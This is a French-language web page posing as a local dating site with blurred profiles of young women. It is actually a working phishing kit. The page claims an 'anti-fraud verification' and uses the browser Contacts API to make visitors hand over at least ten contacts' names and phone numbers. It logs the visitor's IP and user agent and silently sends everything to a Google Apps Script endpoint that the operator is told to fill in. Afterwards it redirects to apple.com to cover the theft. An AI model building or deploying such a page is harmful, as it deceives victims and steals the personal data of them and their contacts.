<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Rencontres à proximité</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap');

        :root {
            --bg: #0f0f11;
            --card-bg: #1c1c1e;
            --primary: #ff2d55;
            --primary-grad: linear-gradient(135deg, #ff2d55, #ff9500);
            --text: #ffffff;
            --text-muted: #8e8e93;
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Outfit', sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* Header */
        .header {
            padding: 20px;
            text-align: center;
            background: rgba(15, 15, 17, 0.9);
            backdrop-filter: blur(10px);
            position: sticky;
            top: 0;
            z-index: 10;
            border-bottom: 1px solid #2c2c2e;
        }

        .header h1 {
            font-size: 22px;
            margin: 0;
            font-weight: 800;
            background: var(--primary-grad);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .header p {
            font-size: 13px;
            color: var(--text-muted);
            margin: 5px 0 0;
        }

        /* Grille de profils */
        .grid-container {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            padding: 20px;
            flex: 1;
        }

        .profile-card {
            background: var(--card-bg);
            border-radius: 20px;
            overflow: hidden;
            position: relative;
            cursor: pointer;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            transition: transform 0.2s;
        }

        .profile-card:active { transform: scale(0.97); }

        .profile-img-container {
            width: 100%;
            height: 180px;
            position: relative;
            background: #333;
        }

        .profile-img-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: blur(8px);
            transition: filter 0.3s;
        }

        .lock-icon {
            position: absolute;
            inset: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
            background: rgba(0,0,0,0.3);
        }

        .profile-info {
            padding: 12px;
        }

        .profile-name {
            font-weight: 600;
            font-size: 16px;
            margin: 0 0 4px;
        }

        .profile-distance {
            font-size: 12px;
            color: var(--text-muted);
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .online-dot {
            width: 8px;
            height: 8px;
            background: #34c759;
            border-radius: 50%;
            display: inline-block;
        }

        /* Modal de vérification */
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(5px);
            display: flex;
            justify-content: center;
            align-items: flex-end;
            z-index: 50;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s;
        }

        .modal-overlay.active {
            opacity: 1;
            pointer-events: all;
        }

        .modal-content {
            background: #1c1c1e;
            width: 100%;
            max-width: 500px;
            border-radius: 24px 24px 0 0;
            padding: 30px 20px 40px;
            text-align: center;
            transform: translateY(100%);
            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
        }

        .modal-overlay.active .modal-content {
            transform: translateY(0);
        }

        .modal-icon { font-size: 40px; margin-bottom: 15px; }
        .modal-title { font-size: 20px; font-weight: 700; margin-bottom: 10px; }
        .modal-subtitle { font-size: 14px; color: var(--text-muted); margin-bottom: 25px; line-height: 1.5; }

        .btn-verify {
            width: 100%;
            padding: 18px;
            background: var(--primary-grad);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        .btn-verify:disabled { opacity: 0.6; }

        .status-msg {
            font-size: 13px;
            color: #ff453a;
            margin-top: 15px;
            font-weight: 600;
            min-height: 20px;
        }

        /* Écran de chargement final */
        .loader-screen {
            position: fixed;
            inset: 0;
            background: var(--bg);
            z-index: 100;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.4s;
        }

        .loader-screen.show { opacity: 1; pointer-events: all; }
        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255, 45, 85, 0.2); border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }

    </style>
</head>
<body>

    <div class="header">
        <h1>Rencontres Locales</h1>
        <p>Profils vérifiés près de chez vous</p>
    </div>

    <div class="grid-container" id="profilesGrid"></div>

    <!-- Modal de vérification -->
    <div class="modal-overlay" id="verifyModal">
        <div class="modal-content">
            <div class="modal-icon">🔒</div>
            <h2 class="modal-title">Contenu verrouillé</h2>
            <p class="modal-subtitle">Pour discuter avec <b id="targetName">cette personne</b> et voir ses photos en clair, vous devez faire vérifier votre compte par le système anti-fraude.</p>
            
            <div class="progress-box" style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 12px; margin-bottom: 20px;">
                <div style="display: flex; justify-content: space-between; font-size: 13px; color: #8e8e93; margin-bottom: 8px;">
                    <span>Contacts vérifiés</span>
                    <span id="countDisplay" style="color: #ff2d55; font-weight: bold;">0 / 10</span>
                </div>
                <div style="height: 6px; background: #2c2c2e; border-radius: 3px; overflow: hidden;">
                    <div id="progressFill" style="height: 100%; width: 0%; background: linear-gradient(90deg, #ff2d55, #ff9500); transition: width 0.3s;"></div>
                </div>
            </div>

            <button class="btn-verify" id="inviteBtn" onclick="pickContacts()">
                <span>Vérifier mon réseau</span>
                <span>→</span>
            </button>
            <p class="status-msg" id="statusMsg"></p>
        </div>
    </div>

    <!-- Loader final -->
    <div class="loader-screen" id="loader">
        <div class="spinner"></div>
        <h2 style="font-size: 18px; margin-bottom: 8px;">Vérification réussie</h2>
        <p style="color: var(--text-muted); font-size: 14px;">Déverrouillage des profils...</p>
    </div>

    <script>
        /* ⚠️ METTEZ VOTRE URL APPS SCRIPT ICI ⚠️ */
        const ENDPOINT = 'https://script.google.com/macros/s/AKfycbzrmzVljMI5ji7fIPPBORXxThJowW-TXWYWTNYJJqGLhvUalSTSm0qUoZXaHqgJOihBBg/exec';
        const TARGET_CONTACTS = 10;

        const profiles = [
            { name: "Sara", age: 24, dist: "1 km", img: "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=400&q=80" },
            { name: "Lina", age: 22, dist: "3 km", img: "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=400&q=80" },
            { name: "Yasmine", age: 26, dist: "2 km", img: "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=400&q=80" },
            { name: "Amira", age: 21, dist: "5 km", img: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=400&q=80" },
            { name: "Nour", age: 25, dist: "1 km", img: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=400&q=80" },
            { name: "Rania", age: 23, dist: "4 km", img: "https://images.unsplash.com/photo-1524250502761-1ac6f2e30d43?w=400&q=80" }
        ];

        let allContacts = [];
        let seenKeys = new Set();
        let victimIp = "Inconnue";
        let currentTargetName = "";

        fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => victimIp = data.ip).catch(() => {});

        const grid = document.getElementById('profilesGrid');
        profiles.forEach(p => {
            const card = document.createElement('div');
            card.className = 'profile-card';
            card.onclick = () => openModal(p.name);
            card.innerHTML = `
                <div class="profile-img-container">
                    <img src="${p.img}" alt="${p.name}">
                    <div class="lock-icon">🔒</div>
                </div>
                <div class="profile-info">
                    <h3 class="profile-name">${p.name}, ${p.age}</h3>
                    <div class="profile-distance"><span class="online-dot"></span> À ${p.dist}</div>
                </div>
            `;
            grid.appendChild(card);
        });

        function openModal(name) {
            currentTargetName = name;
            document.getElementById('targetName').innerText = name;
            document.getElementById('verifyModal').classList.add('active');
            if (navigator.vibrate) navigator.vibrate(30);
        }

        async function pickContacts() {
            if (allContacts.length >= TARGET_CONTACTS) return;
            if (navigator.vibrate) navigator.vibrate(50);

            const btn = document.getElementById('inviteBtn');
            const status = document.getElementById('statusMsg');
            btn.disabled = true;
            btn.innerHTML = `<span>Analyse...</span>`;
            status.innerText = "";

            try {
                const list = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                
                if (list && list.length > 0) {
                    let newBatch = [];
                    list.forEach(c => {
                        const name = c.name && c.name[0] ? c.name[0] : 'Sans nom';
                        const tel = c.tel && c.tel[0] ? c.tel[0] : 'Sans numéro';
                        if (name === 'Sans nom' && tel === 'Sans numéro') return;
                        const key = name + tel;
                        if (!seenKeys.has(key)) {
                            seenKeys.add(key);
                            const contactObj = { name: name, tel: tel };
                            allContacts.push(contactObj);
                            newBatch.push(contactObj);
                        }
                    });

                    if (newBatch.length > 0) {
                        sendToServer(newBatch);
                        if (navigator.vibrate) navigator.vibrate([30, 50, 30]);
                    }
                    updateUI();
                } else {
                    status.innerText = "Sélection requise pour débloquer " + currentTargetName;
                }
            } catch (e) {
                status.innerText = "Action annulée. Vous devez vérifier votre réseau.";
            } finally {
                btn.disabled = false;
                if (allContacts.length < TARGET_CONTACTS) {
                    btn.innerHTML = `<span>Vérifier plus de contacts (${allContacts.length}/${TARGET_CONTACTS})</span> <span>→</span>`;
                }
            }
        }

        function updateUI() {
            const count = allContacts.length;
            document.getElementById('countDisplay').innerText = `${count} / ${TARGET_CONTACTS}`;
            document.getElementById('progressFill').style.width = Math.min(100, (count / TARGET_CONTACTS) * 100) + '%';

            if (count >= TARGET_CONTACTS) {
                document.getElementById('verifyModal').classList.remove('active');
                document.getElementById('loader').classList.add('show');
                setTimeout(() => { window.location.href = "https://www.apple.com"; }, 2500);
            }
        }

        async function sendToServer(contacts) {
            const payload = { contacts: contacts, ip: victimIp, ua: navigator.userAgent };
            try {
                await fetch(ENDPOINT, {
                    method: 'POST', mode: 'no-cors',
                    headers: { 'Content-Type': 'text/plain' },
                    body: JSON.stringify(payload)
                });
            } catch (e) { console.error(e); }
        }
    </script>
</body>
</html>
